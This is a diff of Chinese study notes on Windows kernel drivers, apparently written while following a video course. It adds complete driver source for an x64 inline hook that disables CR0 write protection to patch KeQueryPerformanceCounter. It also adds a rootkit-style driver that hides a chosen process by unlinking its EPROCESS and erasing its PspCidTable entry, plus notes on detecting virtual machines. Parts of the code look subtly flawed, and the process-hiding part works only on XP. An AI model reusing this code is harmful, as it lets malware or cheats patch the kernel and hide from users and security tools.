@@ -1761,15 +1761,419 @@ DriverObject->DriverUnload = NULL;
 
 ###一种特殊钩子###
 
+这一节是介绍6字节Hook，一种特殊的钩子。之所以有这么一种挂钩方式是因为X64的存在，在X86上系统整个空间大小为4G，那么五字节的跳转指令已经能够覆盖整个地址空间了，而在X64的地址空间已经远远超过了4G，五字节的跳转指令就已经无法使用了。X64上一般使用的是14字节的Hook方式，即间接跳转加8字节目标地址的形式（`0xFF25XXXXXXXX-XXXXXXXXXXXXXXXX`）。
 
+其实六字节的钩子方式和14字节方式类似，只是这里并不将8字节的目标地址放到跳转指令后面，而是找一个其他的临近（4G范围内）地方来存放了。
+
+```
+#include <ntddk.h>
+#include <windef.h>
+
+typedef LARGE_INTEGER(__cdecl *PKeQueryPerformanceCounter)(PLARGE_INTEGER performace);
+
+PVOID TargetApi = NULL;
+PVOID OriginApi = NULL;
+BYTE jmp_origin_code[20] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+BYTE HookCode[6] = {0xFF, 0x25, 0xF1, 0xFF, 0xFF, 0xFF};
+
+KIRQL WPOFFx64()
+{
+	KIRQL irql = KeRaiseIrqlToDpcLevel();
+	UINT64 cr0 = __readcr0();
+	cr0 &= 0xfffffffffffeffff;
+	__writecr0(cr0);
+	_disable();
+	return irql;
+}
+
+void WPONx64(KIRQL irql)
+{
+	UINT64 cr0 = __readcr0();
+	cr0 |= 0x10000;
+	_enable();
+	__writecr0(cr0);
+	KeLowerIrql(irql);
+}
+
+NTSTATUS Unload(PDRIVER_OBJECT driver)
+{
+	UNREFERENCED_PARAMETER(driver);
+	KdPrint(("Unload...\n"));
+
+	return STATUS_SUCCESS;
+}
+
+LARGE_INTEGER MyQueryPerfor(PLARGE_INTEGER performancefrequency)
+{
+	PKeQueryPerformanceCounter tempApi = (PKeQueryPerformanceCounter)OriginApi;
+	return tempApi(performancefrequency);
+}
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
+{
+	UNREFERENCED_PARAMETER(driver);
+	UNREFERENCED_PARAMETER(reg_path);
+	KdPrint(("Enter the driver\n"));
+	driver->DriverUnload = Unload;
+
+	UNICODE_STRING hookName = RTL_CONSTANT_STRING(L"KeQueryPerformanceCounter");
+	TargetApi = MmGetSystemRoutineAddress(&hookName);
+
+	ULONG_PTR MyAddress = (ULONG_PTR)MyQueryPerfor;
+	ULONG_PTR OrigAddress = (ULONG_PTR)TargetApi + 0x6;
+
+	RtlCopyMemory(jmp_origin_code, TargetApi, 0x6); // 复制函数的原始6字节代码到桥接内存块
+	RtlCopyMemory(jmp_origin_code + 12, &OrigAddress, 8);// 复制 原始函数地址 + 6 到桥接内存块，用于跳回
+	PVOID targetpool = ExAllocatePool(NonPagedPool, 20);
+	OriginApi = targetpool;
+	RtlZeroMemory(OriginApi, 20);
+	RtlCopyMemory(OriginApi, jmp_origin_code, 20); // 分配非分页内存，用于保存桥接代码
+
+	KIRQL tempIrql = WPOFFx64();
+	RtlCopyMemory((PUCHAR)TargetApi - 0x9, &MyAddress, 8); // 复制Hook函数地址到间接跳转的地址处
+	RtlCopyMemory((PUCHAR)TargetApi, HookCode, 6); // 修改原始函数处代码，写入跳转指令
+	WPONx64(tempIrql);
+
+	return STATUS_SUCCESS;
+}
+```
 
 ###进程隐藏###
 
-###Pubg-PakHacker###
+系统中所有的进程都保存在一个链表中，通过遍历链表就可以找到系统中所有的进程。所以要隐藏进程，则只需要将进程从该链表中摘除即可。这样对于遍历进程链表来显示当前系统中进程的工具，比如任务管理器中就看不到断链的进程了。
+
+上面只是将进程隐藏了一部分，在内核中使用`nt!PsLookupProcessByProcessId`函数依然可以在知道进程ID的情况下获取到进程的EPROCESS结构指针，反汇编一下函数可以发现该函数其实是遍历了一个全局表`nt!PspCidTable`，那么将其中的EPROCESS信息也抹掉就达到了从内核中隐藏的目的。
+
+代码如下所示：
+
+```
+#include <ntddk.h>
+
+PDEVICE_OBJECT pDev = NULL;
+UNICODE_STRING SymLinkName = { 0 };
+UNICODE_STRING DeviceName = { 0 };
+DWORD32 BuildNumb = 0;
+KSPIN_LOCK my_spin_lock;
+ULONG_PTR TableStaz = 0;
+
+#define DOCTL_SETPID CTL_CODE(FILE_DEVICE_UNKNOWN,\
+							  0x9527,\
+							  METHOD_BUFFERED,\
+							  FILE_ANY_ACCESS)
+
+BOOLEAN StartEnumTable(ULONG_PTR start, ULONG_PTR Ep);
+
+NTSTATUS PsLookupProcessByProcessId(
+	HANDLE    ProcessId,
+	PEPROCESS *Process
+);
+
+typedef struct _Hide_Pe
+{
+	ULONG_PTR TargetAddress;
+	ULONG_PTR EpValue;
+}Hide_Pe, *PHide_Pe;
+Hide_Pe BeHided[5] = {0};
+
+ULONG GetWinBuildNum()
+{
+	NTSTATUS status = 0;
+	RTL_OSVERSIONINFOW Version = {0};
+	Version.dwOSVersionInfoSize = sizeof(Version);
+	status = RtlGetVersion(&Version);
+	if (!NT_SUCCESS(status))
+	{
+		return 0;
+	}
+
+	KdPrint(("---%d----\n", Version.dwBuildNumber));
+	return Version.dwBuildNumber;
+}
+
+BOOLEAN HideProcess(HANDLE pid)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS TargetEp = NULL;
+	PLIST_ENTRY pList = NULL;
+
+	ULONG_PTR Activeoffset = 0;
+	ULONG_PTR Handletabe = 0;
+	KIRQL irql = {0};
+
+	BuildNumb = GetWinBuildNum();
+	if (BuildNumb != 2600)	// 只支持XP
+	{
+		return FALSE;
+	}
+	Activeoffset = 0x088;
+
+	status = PsLookupProcessByProcessId(pid, &TargetEp);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("error"));
+		return FALSE;
+	}
+
+	pList = (PLIST_ENTRY)((ULONG_PTR)TargetEp + Activeoffset);
+	if (!MmIsAddressValid(pList))
+	{
+		return FALSE;
+	}
+
+	if (TableStaz != 0)
+	{
+		StartEnumTable(TableStaz, (LONG_PTR)TargetEp);
+	}
+
+	KeAcquireSpinLock(&my_spin_lock, &irql);
+	RemoveEntryList(pList);
+	KeReleaseSpinLock(&my_spin_lock, irql);
+
+	return TRUE;
+}
+
+NTSTATUS Unload(PDRIVER_OBJECT driver)
+{
+	KdPrint(("Unload...\n"));
+	if (pDev)
+	{
+		IoDeleteSymbolicLink(&SymLinkName);
+		IoDeleteDevice(pDev);
+		pDev = NULL;
+	}
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS MyDispatch(PDEVICE_OBJECT pObject, PIRP pIrp)
+{
+	pIrp->IoStatus.Status = STATUS_SUCCESS;
+	pIrp->IoStatus.Information = 0;
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS MyDispatchClose(PDEVICE_OBJECT pObject, PIRP pIrp)
+{
+	for (int i = 0; i < 5; i++)
+	{
+		if (BeHided[i].TargetAddress != 0 && BeHided[i].EpValue != 0) {
+			*(PULONG_PTR)(BeHided[i].TargetAddress) = BeHided[i].EpValue;
+		}
+	}
+
+	pIrp->IoStatus.Status = STATUS_SUCCESS;
+	pIrp->IoStatus.Information = 0;
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS MyDriverIoCtrl(PDEVICE_OBJECT pObject, PIRP pIrp)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	PIO_STACK_LOCATION irpo = IoGetCurrentIrpStackLocation(pIrp);
+	ULONG inLength = irpo->Parameters.DeviceIoControl.InputBufferLength;
+	ULONG outLenght = irpo->Parameters.DeviceIoControl.OutputBufferLength;
+	ULONG CODE = irpo->Parameters.DeviceIoControl.IoControlCode;
+	ULONG info = 0;
+	switch (CODE)
+	{
+	case DOCTL_SETPID:
+	{
+		DWORD32 dwValue = *(DWORD32*)pIrp->AssociatedIrp.SystemBuffer;
+		HANDLE pid = (HANDLE)dwValue;
+		PUCHAR outbuffer = pIrp->AssociatedIrp.SystemBuffer;
+		if (pid)
+		{
+			BOOLEAN bRet = HideProcess(pid);
+			if (bRet)
+				memset(outbuffer, 0x22, 4);
+			else
+				memset(outbuffer, 0x00, 4);
+		}
+		info = 4;
+		break;
+	}
+	default:
+		KdPrint(("error\n"));
+		status = STATUS_SUCCESS;
+		break;
+	}
+
+	pIrp->IoStatus.Status = status;
+	pIrp->IoStatus.Information = info;
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
+}
+
+BOOLEAN FindTable(ULONG_PTR start, ULONG_PTR Ep)
+{
+	BOOLEAN bRet = FALSE;
+	ULONG_PTR pHandle_Table_Entry = 0;
+	pHandle_Table_Entry = *((PULONG_PTR)start) + 0x10;
+	for (ULONG uIndex = 1; uIndex < 0x200; uIndex++)
+	{
+		if (1)
+		{
+			ULONG_PTR TempEp = *((PULONG_PTR)pHandle_Table_Entry) & 0xFFFFFFF8;
+			if (TempEp == Ep)
+			{
+				KdPrint(("Find: ---%p---\n", TempEp));
+				for (int i = 0; i < 5; i++)
+				{
+					if (BeHided[i].TargetAddress == 0 && BeHided[i].EpValue == 0)
+					{
+						BeHided[i].TargetAddress = pHandle_Table_Entry;
+						BeHided[i].EpValue = TempEp;
+						break;
+					}
+				}
+				*((PULONG_PTR)pHandle_Table_Entry) = 1;
+				bRet = TRUE;
+				break;
+			}
+		}
+		pHandle_Table_Entry += 8;
+	}
+
+	return FALSE;
+}
+
+BOOLEAN FindTable1(ULONG_PTR start, ULONG_PTR Ep)
+{
+	BOOLEAN bRet = FALSE;
+	do
+	{
+		bRet = FindTable(start, Ep);
+		start += 8;
+	} while (*(PULONG_PTR)start != 0);
+	return bRet;
+}
+
+BOOLEAN FindTable2(ULONG_PTR start, ULONG_PTR Ep)
+{
+	BOOLEAN bRet = FALSE;
+	do
+	{
+		bRet = FindTable1(start, Ep);
+		start += 8;
+	} while (*(PULONG_PTR)start != 0);
+	return bRet;
+}
+
+BOOLEAN StartEnumTable(ULONG_PTR start, ULONG_PTR Ep)
+{
+	ULONG uFlag = 0;
+	ULONG_PTR TempS = 0;
+	BOOLEAN bRet = FALSE;
+
+	TempS = start & 0xFFFFFFFC;
+	uFlag = start & 0x03;
+	switch (uFlag)
+	{
+	case 0:
+	{
+		bRet = FindTable(TempS, Ep);
+		break;
+	}
+	case 1:
+	{
+		bRet = FindTable1(TempS, Ep);
+		break;
+	}
+	case 2:
+	{
+		bRet = FindTable2(TempS, Ep);
+		break;
+	}
+	default:
+		break;
+	}
+
+	return bRet;
+}
+
+ULONG_PTR SearchTableCode()
+{
+	PVOID pPsLookupProcessByProcessIdAddress = NULL;
+	ULONG_PTR ulPrpcidTableValue = 0;
+	ULONG_PTR TempAddr = 0;
+	ULONG Offset = 0;
+
+	UNICODE_STRING ustrFuncName = {0};
+	RtlInitUnicodeString(&ustrFuncName, L"PsLookupProcessByProcessId");
+	pPsLookupProcessByProcessIdAddress = MmGetSystemRoutineAddress(&ustrFuncName);
+	if (pPsLookupProcessByProcessIdAddress == NULL)
+	{
+		return ulPrpcidTableValue;
+	}
+
+	for (ULONG uIndex = 0; uIndex < 0x100; uIndex++)
+	{
+		if (*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex)) == 0xFF &&
+			*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 1)) == 0x35 &&
+			*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 2)) == 0xC0 &&
+			*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 3)) == 0x49)
+		{
+			Offset = *((PULONG)((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 2)));
+			TempAddr = (ULONG_PTR)Offset;
+
+			ulPrpcidTableValue = *((PULONG_PTR)TempAddr);
+			TempAddr = (ULONG_PTR)ulPrpcidTableValue;
+			break;
+		}
+	}
+
+	return TempAddr;
+}
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+
+	driver->DriverUnload = Unload;
+
+	do
+	{
+		RtlInitUnicodeString(&DeviceName, L"\\Device\\MyHide");
+		status = IoCreateDevice(driver, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &pDev);
+		if (!NT_SUCCESS(status))
+		{
+			break;
+		}
+
+		pDev->Flags |= DO_BUFFERED_IO;
+		RtlInitUnicodeString(&SymLinkName, L"\\??\\HideProcess");
+		status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
+		if (!NT_SUCCESS(status))
+		{
+			break;
+		}
+
+		for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
+		{
+			driver->MajorFunction[i] = MyDispatch;
+		}
+		driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDriverIoCtrl;
+		driver->MajorFunction[IRP_MJ_CLOSE] = MyDispatchClose;
+	} while (FALSE);
+
+	KeInitializeSpinLock(&my_spin_lock);
+	TableStaz = SearchTableCode();
+
+	return status;
+}
+```
+
+这里要简单说一下，视频作者的该驱动是在Win7的X64版本上，我这里修改到了XP上，代码做了些微调，思路是一模一样的！在Win7上在关闭隐藏驱动时，要先将`nt!PspCidTable`中的EPROCESS结构指针恢复，否则会引起蓝屏，但是在WinXP上测试没有发现这个问题。
 
 ###反虚拟机###
 
-###手写内核Shellcode###
+其实前面还有一节是关于某款游戏外挂编写实战，这个我个人没太大兴趣，就不涉及了。
+
+这一节看了视频课程，没有抄写代码。这里描述一下大致思路：通过两个方法来检测，启动内核线程，在线程中获取CPUID，并检查ECX寄存器最高位是否为0，在虚拟机与实体机中ECX寄存器的最高位不同；另外一个方法是在驱动中检查当前系统加载的驱动模块，VMWare会加载一些驱动用于支持硬件，比如鼠标，键盘等。
+
+后面有时间了作为练习写一写这个驱动。
 
 
 
